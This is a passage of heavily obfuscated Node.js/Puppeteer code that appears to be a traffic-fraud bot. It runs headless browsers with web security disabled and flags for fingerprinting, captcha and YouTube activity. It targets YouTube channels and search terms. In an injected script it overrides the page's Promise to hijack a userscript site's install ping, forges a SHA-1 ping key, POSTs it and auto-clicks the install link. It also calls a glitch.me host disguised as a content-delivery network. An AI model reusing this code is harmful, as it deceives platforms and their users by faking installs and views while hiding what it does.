-0x1361) << y[-0x307 * -0x1 + -0x2383 * -0x1 + 0x7 * -0x581 & N++], P[N >> -0x206c + -0x45d * -0x3 + 0x1357] |= (0x96 + 0x1df4 + -0x1e0a | 0x2418 + 0x1 * -0x1219 + -0x20 * 0x8e & L) << y[-0x1 * 0x533 + 0x2 * 0x793 + -0x9f0 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x39 * -0x10 + 0x98f + -0x5bf ? (this['block'] = P[0x4f1 + 0x17df * 0x1 + 0x1cc0 * -0x1], this[U(0x1, '$J(d')] = N - (-0x65 * 0x2f + -0x2 * 0xb89 + 0x5fb * 0x7), this['hash'](), this['hashed'] = -0x1bb * -0xd + 0x8b * 0x2f + -0xf1 * 0x33) : this['start'] = N;
                }
                return this['bytes'] > -0xd3bd78f3 + 0x1b947679f * 0x1 + 0x1a761153 && (this['hBytes'] += this['bytes'] / (-0xee97748c + -0x1699a * 0x11de0 + 0x382644d4c) << 0x115e + -0x1 * 0x5fb + -0xb63, this['bytes'] = this['bytes'] % (0x1dd9a00f4 + -0xfd2a0640 + 0x1f90054c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x47 * 0x11 + -0x20b * -0x2 + -0x8cc;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1bd1 * -0x1 + -0x1071 * 0x2 + 0xc27 * 0x5] = this['block'], J[K >> 0x1deb + -0x2f * 0xaf + 0x8 * 0x47] |= x[0x6f0 + 0x17da + -0x1ec7 & K], this['block'] = J[-0x1a85 * -0x1 + -0x8fd + -0x1178], K >= 0xb19 + 0xf1f + -0x1a00 && (this['hashed'] || this['hash'](), J[0x391 + 0x62 * 0x4f + -0x21cf] = this['block'], J[0x25f4 + 0x1470 + -0x3a54] = J[0x244f + 0x16 * 0x4f + -0x2b18] = J[-0x1618 + 0x8b0 + 0xd6a] = J[0x2442 * -0x1 + -0x2e2 + 0x101 * 0x27] = J[0x1c75 + 0x497 + -0x2108] = J[-0x20a7 + -0x6ee + -0x1 * -0x279a] = J[0x3aa + 0x1d35 + -0x20d9] = J[-0x4 * 0x304 + 0x16f + 0xaa8] = J[-0xb4e + -0x15 * 0xe5 + 0x1e1f] = J[-0x1 * -0x202a + -0x2 * -0xfce + -0x3fbd] = J[-0x3 * -0x635 + -0xcc4 + -0x5d1 * 0x1] = J[-0xdb0 + -0x20fe * -0x1 + -0x1343 * 0x1] = J[-0xcaf + -0x1 * 0x17fe + 0x24b9] = J[-0xfcb * 0x1 + -0x1e7e + -0x2e56 * -0x1] = J[0x19ad + -0xbd8 + -0xdc7 * 0x1] = J[-0x3ba * -0x1 + 0x129e + -0xa3 * 0x23] = -0xf8a + -0x8d3 + 0x185d), J[-0x1 * -0x2345 + 0x32 * -0x74 + 0x1 * -0xc8f] = this['hBytes'] << -0x203d + -0x13f * 0x17 + 0x3ce9 | this['bytes'] >>> -0x119c + -0x16d1 + 0x288a, J[0x14aa + 0x6ad * 0x2 + 0x21f5 * -0x1] = this['bytes'] << 0x1 * 0x115f + -0xd18 + 0x1 * -0x444, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2 * -0x2f + -0x16 + 0x4 * -0xe; J < -0x112b + 0x177 * 0x18 + -0x11ad; ++J)
                K = Q[J - (-0xf * -0xc1 + 0x3cb + 0x1 * -0xf17)] ^ Q[J - (0x56a + -0x901 * -0x2 + -0x1764 * 0x1)] ^ Q[J - (0x1f81 + -0x1 * -0x245b + -0x43ce)] ^ Q[J - (-0x244b + 0xa54 + 0x1a07)], Q[J] = K << -0x186f + -0x318 * -0x2 + 0x1240 | K >>> -0x5b9 + -0x14df + 0x1ab7;
              for (J = 0x1 * 0x1071 + 0x576 + -0x15e7; J < 0x1f0e + 0x8f6 + -0x27f0; J += -0x29 * 0x9d + 0x2705 + 0x1 * -0xddb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xeac + 0x1217 + -0x366 | L >>> -0x2aa + -0x2f1 * 0x1 + -0x56 * -0x11) + (M & N | ~M & O) + P + (-0x4dc * 0x1fa2f1 + -0x566b2738 + -0x21 * -0xa05224d) + Q[J] << 0x1925 * -0x1 + 0xff0 + 0x935 * 0x1) << -0x2456 + 0x2477 * -0x1 + -0x1a * -0x2cd | P >>> -0x1769 * 0x1 + -0x10e0 + 0x2864) + (L & (M = M << 0x1 * 0x1436 + -0x763 * -0x1 + -0x1b7b | M >>> -0x367 * -0x6 + -0x151 * -0x7 + -0x1d9f) | ~L & N) + O + (-0x5a3ddef6 + 0xaa470144 + 0xa79574b) + Q[J + (0x1 * 0x14f9 + -0x694 + -0xe64)] << -0xde5 + 0x10 * -0x147 + 0x2255) << -0x236d + -0x163 + -0x7 * -0x543 | O >>> -0x20c7 + -0x263 * 0x5 + 0x2cd1 * 0x1) + (P & (L = L << 0x1 * 0xb2b + 0x7 * 0x1a3 + 0x2b * -0x86 | L >>> -0x1 * 0xc23 + -0xf61 + 0x1b86) | ~P & M) + N + (0x68084e1e + -0x36548286 * 0x1 + 0x1 * 0x28ceae01) + Q[J + (0xf48 + -0x97f * 0x1 + -0x5c7)] << 0x17b7 + 0x1b * -0x4b + -0xfce) << -0x7 * -0x3df + 0xb98 + -0x7bc * 0x5 | N >>> -0x1 * -0x1088 + 0xeaf * 0x1 + -0x1f1c) + (O & (P = P << 0xe56 + -0x15b0 + 0x778 | P >>> 0x7 * -0x2b + 0xd79 + -0xc4a) | ~O & L) + M + (0x408cd27f + 0x46e34dc8 + -0x2ceda6ae) + Q[J + (0x1a4e + 0x440 + -0x45d * 0x7)] << -0xb * -0xbe + -0x379 * -0x6 + -0x1d00) << -0x3b6 + -0x90 + 0x44b | M >>> 0x1467 + -0x267d + 0x1231) + (N & (O = O << 0x100e + 0x1 * 0x18b9 + -0x28a9 | O >>> 0x1 * -0x85d + 0x1ed + 0x672) | ~N & P) + L + (-0x7c3b9221 + 0x5c170cef + 0x7aa6fecb) + Q[J + (-0x10aa + 0x1b13 * 0x1 + -0xa65)] << -0x7 * 0x271 + 0x61d * 0x1 + 0xafa, N = N << -0x1 * 0x224e + -0x1 * -0x7cf + 0x1a9d | N >>> -0x2251 + 0x1fd * 0x13 + -0x374;
              for (; J < 0x127a + 0xa49 + -0x1c9b * 0x1; J += 0x1 * -0x2099 + -0x1590 + 0x362e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x205 * -0xe + -0x897 + -0x1271 * -0x2 | L >>> -0x255f + -0x1 * -0xca6 + 0x18d4) + (M ^ N ^ O) + P + (-0x6d161b * -0x1b + 0x2 * -0x67771973 + 0x13246c9ae) + Q[J] << 0xb * -0x2b0 + -0x1d80 + 0x3b10) << -0x85 * -0xe + -0x1 * -0xdd3 + 0x4c * -0x47 | P >>> -0xad * 0xc + 0xbe1 + 0x2 * -0x1d5) + (L ^ (M = M << -0xae * 0x2a + -0x95f * 0x1 + 0x2609 | M >>> -0x10 * -0xfa + 0x222a * 0x1 + -0x31c8) ^ N) + O + (0xa71d77ad + -0x3123ead0 + -0x2 * 0x38fd09e) + Q[J + (-0x23b5 + 0x11 * -0x53 + 0x2939)] << -0x4 * -0x489 + 0x21ab + -0x33cf) << -0x4b7 + -0x4cb + 0x987 | O >>> -0x1975 + -0x106 * 0x13 + 0x2d02) + (P ^ (L = L << -0x69 * -0x3e + 0x2298 + -0x77d * 0x8 | L >>> 0x11fc + -0x1a0e + 0x814) ^ M) + N + (-0x1 * 0xd18084b3 + 0x5a4a2cff + 0xe6104355) + Q[J + (0x3 * -0xbf + 0xaf * 0x23 + 0x4a * -0x4b)] << -0x6c * 0x5a + -0xa87 + 0x307f) << 0x377 * 0x1 + -0x16a2 * -0x1 + 0xd0a * -0x2 | N >>> -0x25 * -0x9f + 0x2 * 0x715 + -0x250a) + (O ^ (P = P << -0x1d * -0xe3 + 0x14e5 + -0x2e7e | P >>> 0x1c8d + 0x1710 + -0x339b) ^ L) + M + (0x3 * 0x2eaad805 + 0x3 * -0x46dd1c88 + 0xb770b92a) + Q[J + (0x3 * -0x71 + 0x1 * -0x16f7 + 0x1 * 0x184d)] << -0x69b * -0x1 + 0x67 * 0x1d + -0x1246 * 0x1) << 0x65 * -0x51 + 0x1e7b + 0x17f | M >>> 0x23b * 0x11 + -0x5 * 0x5ba + -0x92e) + (N ^ (O = O << -0x171 * 0xb + -0x2e8 * 0x3 + 0x18b1 | O >>> -0x1ac8 * 0x1 + -0x10d * -0x17 + 0x3d * 0xb) ^ P) + L + (-0xb1aef75b * -0x1 + 0x37d28f2d + -0x7aa79ae7) + Q[J + (-0x413 * 0x7 + -0x1 * 0x1538 + 0x31c1)] << -0x98b + 0x1a8 + -0x3 * -0x2a1, N = N << -0x1783 + -0x142d + 0x642 * 0x7 | N >>> -0x3 * 0x287 + 0x3d9 + 0x3be;
              for (; J < 0x25e5 + -0x2b9 + -0x4 * 0x8bc; J += -0x12c7 + -0x1 * 0x1d1 + 0x3 * 0x6df)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5a0 + 0x48e + -0x3 * -0x5d | L >>> 0x3 * -0x466 + 0x20b2 + -0xf * 0x14b) + (M & N | M & O | N & O) + P - (-0x16b * 0x2cff89 + -0x19c6931 * -0x35 + 0x5b50d342) + Q[J] << 0xfb * -0xf + -0xb65 + -0x1 * -0x1a1a) << 0x7ca * -0x3 + 0x7d7 * 0x1 + 0xf8c | P >>> 0x3 * -0x5 + 0x23c6 + 0x35 * -0xac) + (L & (M = M << 0xc84 + 0x1 * -0x5e7 + -0x67f | M >>> 0x1 * -0x1 + 0x18ed + -0x18ea) | L & N | M & N) + O - (0x1e864b23 * -0x1 + -0x3ff52834 + 0xcf5fb67b) + Q[J + (0xa67 + 0x2 * 0x12d5 + -0x3010)] << -0x1b * -0x9 + -0x7 * -0x552 + -0x2631) << -0xf27 + 0xa7f * 0x2 + -0x5d2 | O >>> -0x1f49 * 0x1 + 0x5 * 0x518 + 0x5ec) + (P & (L = L << -0x23d * 0x2 + -0x3d * -0x9d + -0x20d1 | L >>> 0x153c + -0x20ec + 0x2 * 0x5d9) | P & M | L & M) + N - (-0xe * 0xdb14836 + -0xa27af990 + 0x1 * 0x1d3112fa8) + Q[J + (-0xb99 * -0x1 + 0x1312 * 0x2 + -0x31bb)] << -0xa3 + -0x570 + 0x613) << -0x1999 + -0x10dc + 0x2 * 0x153d | N >>> -0x149 * -0x1 + -0x457 * -0x4 + -0x128a) + (O & (P = P << 0x1549 + -0x18cf + 0x3a4 | P >>> 0x6d1 * 0x5 + 0x148 * -0xb + -0x13fb) | O & L | P & L) + M - (0x9a1ca4fb + -0x68c53751 + -0x4e372e2 * -0xd) + Q[J + (0x427 * -0x1 + 0xd * 0x185 + 0xf97 * -0x1)] << 0x21c2 + -0x2263 * 0x1 + 0x17 * 0x7) << 0x1b * 0x20 + -0x1493 + 0x1138 | M >>> -0x3 * 0x2d6 + -0x2076 + 0x2913) + (N & (O = O << -0xa * 0xf7 + 0x1 * 0x19a0 + -0x1c * 0x91 | O >>> -0x5a6 * -0x5 + -0x90a + -0x7 * 0x2be) | N & P | O & P) + L - (-0x7d8fe4 + 0xe4ed * -0x66b3 + 0xcd3852bf) + Q[J + (-0x134f * 0x2 + -0x36e * 0x8 + 0x4212)] << -0xf15 + 0x2 * -0x47b + 0x5 * 0x4cf, N = N << -0x33d + 0x909 + -0x5ae | N >>> 0x1476 + 0x4 * 0x66 + -0x160c;
              for (; J < -0x15a2 + -0x22e1 * -0x1 + 0x1 * -0xcef; J += -0x6c5 * 0x4 + 0x4 * 0x336 + 0xe41)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1778 + -0xf3c + 0x2bd * -0x3 | L >>> 0x28a * 0xf + -0x10ab + -0x1550) + (M ^ N ^ O) + P - (0x1 * -0x62e66703 + -0x1 * 0x1d10283a + 0xe61 * 0xca0c7) + Q[J] << 0x2f * -0x5c + -0x1 * 0x25db + -0x36bf * -0x1) << 0x1757 * 0x1 + 0x617 + -0x1 * 0x1d69 | P >>> -0x1394 + 0x1d24 + -0x10d * 0x9) + (L ^ (M = M << 0x1096 + 0x11 * -0xdf + -0x1a9 | M >>> 0xfa3 + 0xd * -0x283 + 0x1106) ^ N) + O - (0x1 * 0x50c3eed1 + -0x35b92e94 + 0x1 * 0x1a927ded) + Q[J + (0x9c5 + -0x473 + -0x551)] << -0x21f4 + 0x1 * 0x2d7 + 0x1f1d) << -0x73 * 0x4 + -0x2342 + -0x1 * -0x2513 | O >>> 0x1 * -0x209f + -0x163 * -0x18 + 0x1 * -0x8e) + (P ^ (L = L << -0xd * 0x2f5 + 0x4ba + 0x21d5 | L >>> 0xf * -0x25a + -0xa58 * -0x2 + 0xe98) ^ M) + N - (0x613fb38a + -0x217a9c64 + -0xa27d8fc) + Q[J + (0x2658 + -0xd27 + 0x15 * -0x133)] << 0x134d + 0x9dd * -0x2 + 0x6d) << -0x25e * -0x9 + 0x1f * 0x139 + -0x3b30 | N >>> -0x1b20 + -0xb * -0x2e3 + -0x486) + (O ^ (P = P << 0x1038 + 0x1352 + -0x236c * 0x1 | P >>> -0x1c0e + 0x1b27 + 0x1 * 0xe9) ^ L) + M - (-0x2588359 + -0x812 * 0x1b156 + -0x9 * -0x7bc52d7) + Q[J + (-0xb55 + 0x6e0 + 0xb * 0x68)] << -0x30c + -0xf * -0x11 + 0x3 * 0xaf) << -0x2 * 0x386 + 0xa34 + -0x323 | M >>> 0x577 + 0x38 * -0x9d + 0x1cfc) + (N ^ (O = O << -0x1093 + -0x2603 + -0xdad * -0x4 | O >>> 0x10e3 + 0xc77 * 0x1 + -0x1d58) ^ P) + L - (0x51a * -0x6fab4 + -0x5f0f7e4c + -0x23f5047 * -0x52) + Q[J + (-0x1 * 0xf7f + -0x1342 + 0x22c5)] << 0x25c3 + 0x1e37 + -0x43fa, N = N << -0xd * 0x199 + 0x1 * 0x1c3d + -0x75a | N >>> 0x1 * 0xa5 + 0x8c2 + -0x965;
              this['h0'] = this['h0'] + L << -0xe74 + -0xc69 * -0x1 + -0x1 * -0x20b, this['h1'] = this['h1'] + M << 0x2559 + -0x1 * -0x14a1 + -0x39fa, this['h2'] = this['h2'] + N << -0x23f8 + -0x187d * -0x1 + -0xb7b * -0x1, this['h3'] = this['h3'] + O << 0x2 * -0xf47 + -0x2ff * -0x7 + 0x995, this['h4'] = this['h4'] + P << -0x21a9 + 0x1 * 0x1357 + -0x1a * -0x8d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1 * -0x9a3 + -0x2 * -0xa53 + -0xae7 & 0x1b67 + -0x453 * 0x8 + 0x740] + w[J >> 0x7eb * -0x1 + -0x3ca + -0x3ef * -0x3 & -0x1 * 0xbb + -0x2 * 0x1193 + 0x73 * 0x50] + w[J >> -0x1535 + 0x38b * 0x1 + 0x11be & -0x119e + 0x126d + -0xc0] + w[J >> -0x102b * 0x2 + 0xa9 * -0x24 + 0x382a & 0x19f + -0x2340 + 0x1 * 0x21b0] + w[J >> -0x611 + -0x2 * 0x88b + 0x1733 & -0xedc + 0x2187 * -0x1 + 0x3072] + w[J >> -0xfb7 * 0x1 + 0xf62 + -0x1f * -0x3 & 0x26a2 + -0x64 + 0x17 * -0x1a9] + w[J >> -0x2142 + -0x11ff + 0x36b * 0xf & -0x708 + -0x125 * 0x6 + -0x18d * -0x9] + w[-0x436 + -0x866 + 0x2f * 0x45 & J] + w[K >> -0x2236 + -0x700 + 0x2952 & -0xa1b + -0xb8 * 0x2b + 0x5de * 0x7] + w[K >> 0x22f8 + 0x5 * 0x3e8 + -0x3668 & -0x713 * -0x5 + -0x135 * -0x19 + -0x417d] + w[K >> 0xd98 + 0x1 * -0x220f + -0x148b * -0x1 & 0xb7 * -0xd + 0x2 * -0xfa3 + 0x320 * 0xd] + w[K >> 0x1273 * -0x1 + 0x26b + -0x1018 * -0x1 & -0x7b * -0x44 + -0x12c6 + -0xdd7] + w[K >> -0x2430 + 0x1f27 + 0x515 * 0x1 & 0x2456 + 0xd47 + -0x318e * 0x1] + w[K >> 0x1e89 + 0x1 * 0x1ee2 + -0x3d63 & 0x1 * 0x2196 + 0x7 * -0x4ef + -0x1 * -0x102] + w[K >> 0x6ef + -0x21d9 + 0x1aee & 0x1549 * 0x1 + 0x123b + -0x103 * 0x27] + w[-0x1a62 + -0x104 * 0x13 + 0x2dbd & K] + w[L >> 0x15 * 0x141 + 0x1a58 + 0x3491 * -0x1 & -0x19 * 0x16b + 0x2e3 * -0x7 + 0x37b7] + w[L >> 0x1767 + 0x2 * -0xdf + 0x1 * -0x1591 & -0x3 * 0xa39 + -0x1 * 0x12da + 0x3194] + w[L >> 0x51 * 0x66 + 0x23f2 + -0x4de * 0xe & -0x2605 * 0x1 + -0x295 * 0x7 + 0x7d * 0x73] + w[L >> -0x1 * 0x7f7 + -0xece + -0x23 * -0xa7 & 0x16c4 + -0x1fda + 0x925] + w[L >> 0x2ac * 0x7 + -0x1859 + 0x5b1 & -0xed1 * -0x1 + -0x19 * -0x47 + 0x15b1 * -0x1] + w[L >> -0x101c + 0x1 * -0x1b9d + -0x1e7 * -0x17 & -0x1be8 + -0x1a3c + 0x3633] + w[L >> -0x1 * -0x23c9 + -0x3 * 0xc23 + 0x52 * 0x2 & 0x24fd + 0x3 * 0xc2 + -0x2734] + w[0x2 * 0x113b + 0x1 * -0x368 + -0x1eff & L] + w[M >> 0x40f * 0x5 + 0x41 * -0x91 + 0x10a2 & -0x7 * 0x44b + 0x159 + 0x1cc3] + w[M >> -0x2579 + -0x25de + 0x4b6f & 0x161a + 0x1238 + 0xb * -0x3a9] + w[M >> -0x14d * -0x15 + 0xa1a + 0xb * -0x365 & 0x117 + -0x133c + 0x1234] + w[M >> -0x1 * -0x1727 + 0x1886 + -0x33 * 0xef & 0x2 * 0xe95 + 0x16ef + -0x340a] + w[M >> -0x6 * 0x1c1 + 0x4 * -0x6f7 + -0x266e * -0x1 & 0x1d9 * -0x4 + 0x794 * 0x1 + 0x3 * -0xb] + w[M >> -0x2 * 0xe + -0x11 * 0x10d + 0x1201 & -0x1861 * -0x1 + 0x4 * 0x92f + -0x3d0e] + w[M >> -0x47 * -0x67 + 0x48c * -0x1 + -0x1801 & -0x81 * 0xf + 0x1626 + -0x28 * 0x5d] + w[0x11f3 + 0x739 + -0x191d & M] + w[N >> -0xdcc + -0x12cb + -0xb * -0x2f9 & 0x2638 + 0xe * -0x6 + -0x25d5] + w[N >> -0x25e * 0x7 + 0xc * -0x229 + 0x2a96 & -0x44a * -0x7 + -0x86 * 0x2f + 0x1 * -0x55d] + w[N >> -0x101c + -0x12 + 0x2 * 0x821 & -0x1ecb * 0x1 + 0x1018 + 0xec2] + w[N >> 0x14cd + -0x2 * 0xa4 + -0x1375 & -0x1228 + 0x19ed + -0x7b6] + w[N >> -0x821 + -0x21 * -0x7 + 0x746 & -0x2 * 0xd69 + 0x1 * -0x2019 + -0x3afa * -0x1] + w[N >> -0xf8 * 0x3 + 0x16a1 + 0x1 * -0x13b1 & -0x70b + 0x226e + -0x1b54] + w[N >> 0xd1a + -0x741 + -0x5d5 & 0x3c6 + 0x53f + -0x8f6] + w[-0x3 * 0xca6 + -0x417 + 0x2a18 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1415 + -0x20b4 + 0xcb7 & -0x22b1 + 0x2286 + 0x12a,
                J >> -0x5bf + 0x21b5 * 0x1 + -0x1be6 & 0xca9 + 0x6d * 0x7 + 0xea5 * -0x1,
                J >> -0x1c58 + -0x2287 + 0x3ee7 & -0x1 * 0x162e + -0x1113 + -0xe * -0x2e0,
                -0x2114 + 0xd1d + 0x14f6 * 0x1 & J,
                K >> 0x13a9 + 0x15a9 + -0x293a & -0x691 + -0x14be + 0x1c4e,
                K >> -0x1 * 0x188c + -0xdcd + -0x2669 * -0x1 & -0x333 * -0x7 + 0x1a * 0x71 + -0x20e0,
                K >> 0x178e + -0xd * 0x5b + -0x1 * 0x12e7 & -0x11a2 + 0x1b84 + -0x8e3,
                -0x2f * -0x10 + 0x2 * -0x35f + 0x4cd * 0x1 & K,
                L >> -0xe6e + 0x198a + -0xb04 & 0x2021 + -0x7 * -0x1f7 + 0x2ce3 * -0x1,
                L >> -0x87 * 0x1b + -0x220a + 0x3057 & -0xe19 + -0x25a8 + 0x40 * 0xd3,
                L >> 0x103c + -0x66c + -0x9c8 & 0x1 * 0x8db + 0xd9 * -0x2d + 0x1e49,
                -0x173e * -0x1 + -0xba9 + -0x54b * 0x2 & L,
                M >> 0xb15 * 0x1 + 0xf85 + -0x1a82 & -0x52 * -0x67 + 0x287 + 0x2286 * -0x1,
                M >> -0x1 * -0x6e7 + 0x238c + -0x1 * 0x2a63 & 0x1d5d + 0xbbd + -0x281b,
                M >> -0x2 * -0xfae + -0x1 * -0x2359 + -0x42ad & -0x15e1 + -0x192d + -0x1 * -0x300d,
                -0x1b1 * -0x3 + 0x1a51 + 0x1 * -0x1e65 & M,
                N >> -0x504 + 0x1 * -0x1ff + -0x6b * -0x11 & 0x4 * -0x827 + 0x5fc * 0x1 + -0x935 * -0x3,
                N >> 0x1 * 0xcbc + 0x1 * 0x16f7 + -0x23a3 & 0x7 * 0x413 + 0x1 * 0x3ef + -0x1f75,
                N >> 0x1e7 * -0x5 + 0x17a * 0x1 + -0x19d * -0x5 & 0x22b6 + 0x1 * -0x869 + -0x194e,
                -0x8ec * -0x2 + -0x281 * 0x4 + -0x6d5 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1832 + 0x8e1 + 0xf65), (K = new DataView(J))['setUint32'](-0x51e + -0x19 * -0xa3 + -0xacd, this['h0']), K['setUint32'](-0xa3 * -0x16 + 0x1 * -0xa8a + -0x374, this['h1']), K['setUint32'](-0x13f * -0xb + 0xc71 * 0x3 + 0x2 * -0x1980, this['h2']), K['setUint32'](-0x22e5 + 0xd6e + 0x1583 * 0x1, this['h3']), K['setUint32'](-0xea2 + -0x232 + -0x10e4 * -0x1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x7 * -0x2ad + -0x5 * 0x6ff + 0x35b6];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x683 + 0x54b * -0x5 + -0x2 * -0x9fa;
            J[-0x3b2 * 0x4 + -0xabb * 0x2 + 0x121f * 0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x2 * -0xde0 + -0x1210 + -0x9b0] = L => {
              const V = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I[V(0x3) + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x44b * -0x1 + 0xf5a + -0x5 * 0x236), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x4d * 0x12 + 0x14e5 + 0x1 * -0xf7a;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x174c + 0x445 * 0x1 + 0x18e3), Promise['resolve'](0x3f * -0x53 + 0x3bf * -0x1 + 0x182d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xd * -0x1eb + 0x1a8a * -0x1 + 0x3379; j < 0xc6d + -0x58 * 0x12 + 0x4 * -0x18f; j++)
    i();
}
const NETWORK_PATIENCE = -0x38f0 + -0x3ccd + 0x94fd + (-0x1 * 0x48b + 0x6b * 0xd + 0x21 * 0x54) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x2104 + 0xff6 * 0x2 + 0x11b) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function a() {
  const bo = [
    'yxHPB3m',
    'WQ15eCoPpa',
    'easyfork.o',
    'z2v0qxr0CMLIDq',
    'z290BW',
    'slice',
    'y2XLyxi',
    'ross-origi',
    'YWXfelRk3b',
    'y29Yzs1PBwfNzq',
    'J3ygeDEMnO',
    'ChrZlZqYndq0nW',
    'goto',
    'Ahr0Chm6lY9Tzq',
    'https://gr',
    'W73dHSkcW4ldM34',
    'zwvKyMfJAY1ZAa',
    'craft\x20mons',
    'ramming/le',
    'oYbtts1ootyWvq',
    'BM9Uzq',
    'x1TlCNvUA2vYxW',
    'z8ojjmkyWQddVmoEW6ZdHNa',
    'FCoYW6RdImokWPhcH8oqW5HW'
  ];
  a = function() {
    return bo;
  };
  return a();
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require(W(0x0)),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + X(0xf, 'HOyc'),
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x7 * 0x3e3 + 0xdef + 0x2 * 0x6a3; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const Y = c;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j[Y(0x6)](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 